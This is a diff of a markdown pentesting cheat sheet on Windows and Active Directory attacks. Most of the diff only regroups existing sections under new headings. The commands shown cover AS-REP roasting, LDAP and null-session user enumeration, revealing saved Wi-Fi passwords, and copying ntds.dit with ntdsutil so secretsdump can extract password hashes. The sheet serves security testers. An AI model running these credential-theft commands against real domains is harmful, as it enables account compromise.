@@ -13,6 +13,8 @@ mitre:
 ---
 
 
+## Find accounts
+
 ### List SPN accounts
 
 An account can be used to executes features (Service) on a server. Theses features
@@ -109,6 +111,59 @@ python GetNPUsers.py <domain>/ -usersfile users.txt -format <john/empty> -output
 From [@harmj0y](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py).
 
 
+### AdminCount, AdminSDHolder & SDProp
+
+The Security Descriptor propagator (`SDProp`) process runs every 60 minutes
+and re-sets the ACL of the protected objects with the security permissions set
+on the `AdminSDHolder` (check with ADExplorer).
+
+The objects protected by `AdminSDHolder`have the attribute `AdminCount` set to 1:
+
+```powershell
+$persons = (New-Object System.DirectoryServices.DirectorySearcher("(&(admincount=1)(objectCategory=person))")).FindAll()
+$groups = (New-Object System.DirectoryServices.DirectorySearcher("(&(admincount=1)(objectCategory=group))")).FindAll()
+```
+
+It's possible to change the `SDProp` interval from 60 to 7200 seconds (one minute to two hours).
+You can also run the process manually.
+
+Source: [https://adsecurity.org/?p=1906](https://adsecurity.org/?p=1906)
+
+
+### Truster Account
+The [PDF](https://www.sstic.org/media/SSTIC2014/SSTIC-actes/secrets_dauthentification_pisode_ii__kerberos_cont/SSTIC2014-Article-secrets_dauthentification_pisode_ii__kerberos_contre-attaque-bordes_2.pdf) from SSTIC 2014 describes trusts accounts on Windows:
+
+```
+sAMAccountType: 805306370 = ( TRUST_ACCOUNT );
+```
+
+
+### User enumeration
+
+#### LDAP search
+
+Here is two queries to fetch informations of a domain controller using LDAP:
+
+```bash
+ldapsearch -h <host> -x -s base namingcontexts
+ldapsearch -h <host> -x -b "DC=xxx,DC=yyy" '(objectClass=Person)' sAMAccountName
+```
+
+
+#### RPCClient
+
+If the NULL session is activated on the Windows domain, then you can list the users
+with `rpcclient`:
+
+```bash
+rpcclient -U '' <host>
+rpcclient $> enumdomusers
+rpcclient $> queryuser <user>
+```
+
+
+## Find passwords
+
 ### Decrypt GPO with cpassword
 
 Some `Group Policy Preferences` (GPP) GPO stored at `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`
@@ -119,21 +174,6 @@ get the clear text credentials the [Python script can be used](/assets/cpassword
 
 This [article on AdSecurity](https://adsecurity.org/?p=2288) presents other tools
 and the protection ([KB2962486](https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati)).
-
-
-### Use Win32 API in Python
-
-Download then install the pip package `pywin32` here: [https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32](https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32)
-
-
-### Get NTP configuration server
-```bash
-$ w32tm /query /status
-```
-
-
-### Windows 10 versions
-[Release Informations](https://docs.microsoft.com/fr-fr/windows/release-information/)
 
 
 ### Dump LSASS process
@@ -204,12 +244,54 @@ print(hashlib.new('md4', pwd.encode('utf-16le')).hexdigest())
 ```
 
 
-### Truster Account
-The [PDF](https://www.sstic.org/media/SSTIC2014/SSTIC-actes/secrets_dauthentification_pisode_ii__kerberos_cont/SSTIC2014-Article-secrets_dauthentification_pisode_ii__kerberos_contre-attaque-bordes_2.pdf) from SSTIC 2014 describes trusts accounts on Windows:
+### List Wifi networks and password
 
+```bash
+$ netsh wlan show profile
+$ netsh wlan show profile <WiFi name> key=clear
 ```
-sAMAccountType: 805306370 = ( TRUST_ACCOUNT );
+
+### Extract NTDS from a domain controller
+
+On a DC, open a cmd shell:
+
+```batch
+ntdsutil
+activate instance ntds
+ifm
+create full C:\ntds.dit
+quit
+quit
 ```
+
+If you have a remote shell, you can also use the one-liner:
+
+```batch
+ntdsutil "ac i ntds" "ifm" "create full C:\ntds.dit" q q
+```
+
+On your machine, use `impacket` to recover the hashes:
+
+```bash
+python secretsdump.py -ntds <ntds.dit> -system <SYSTEM> LOCAL -outputfile <output> -pwd-last-set -user-status -history
+```
+
+
+## Miscs
+
+### Use Win32 API in Python
+
+Download then install the pip package `pywin32` here: [https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32](https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32)
+
+
+### Get NTP configuration server
+```bash
+$ w32tm /query /status
+```
+
+
+### Windows 10 versions
+[Release Informations](https://docs.microsoft.com/fr-fr/windows/release-information/)
 
 
 ### Compile .Net without Visual Studio
@@ -249,13 +331,6 @@ execute an other binary.
 [Julian Horoszkiewicz explains the details on his blog](https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-path-traversal-in-cmd-exe/)
 
 
-### List Wifi networks and password
-
-```bash
-$ netsh wlan show profile
-$ netsh wlan show profile <WiFi name> key=clear
-```
-
 ### TCP dump with netsh
 
 You can use `netsh trace` to dump TCP connexions on a Windows system. The following
@@ -280,6 +355,7 @@ $ etl2pcapng.exe NetTrace.etl  NetTrace.pcapng
 IF: medium=eth  ID=0    IfIndex=13
 Converted 3948 frames
 ```
+
 
 ### Add user to local admin
 
@@ -318,56 +394,4 @@ cached files of the process in the two directories:
 ```
 %USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
 %USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData
-```
-
-
-## User enumeration
-
-### LDAP search
-
-Here is two queries to fetch informations of a domain controller using LDAP:
-
-```bash
-ldapsearch -h <host> -x -s base namingcontexts
-ldapsearch -h <host> -x -b "DC=xxx,DC=yyy" '(objectClass=Person)' sAMAccountName
-```
-
-
-### RPCClient
-
-If the NULL session is activated on the Windows domain, then you can list the users
-with `rpcclient`:
-
-```bash
-rpcclient -U '' <host>
-rpcclient $> enumdomusers
-rpcclient $> queryuser <user>
-```
-
-## Extract NTDS from a domain controller
-
-
-### ntdsutil
-
-On a DC, open a cmd shell:
-
-```batch
-ntdsutil
-activate instance ntds
-ifm
-create full C:\ntds.dit
-quit
-quit
-```
-
-If you have a remote shell, you can also use the one-liner:
-
-```batch
-ntdsutil "ac i ntds" "ifm" "create full C:\ntds.dit" q q
-```
-
-On your machine, use `impacket` to recover the hashes:
-
-```bash
-python secretsdump.py -ntds <ntds.dit> -system <SYSTEM> LOCAL -outputfile <output> -pwd-last-set -user-status -history
 ```
